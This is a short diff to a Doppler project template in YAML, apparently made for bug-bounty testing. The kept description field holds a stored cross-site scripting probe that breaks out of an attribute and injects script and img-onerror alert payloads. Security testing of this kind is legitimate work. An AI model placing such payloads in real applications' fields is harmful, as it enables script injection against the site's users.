@@ -1,15 +1,3 @@
-# Doppler Project Template
-# https://doppler.com
-
 projects:
   - name: "projetobugbounty"
     description: "Configuracoes gerais \"><script>alert(document.domain)</script><img src=x onerror=alert(1)>"
-    environments:
-      - name: "Development"
-        slug: "dev"
-        configs:
-          - slug: "dev"
-
-secrets:
-  - dev:
-      CHAVE_VALIDA: "123"
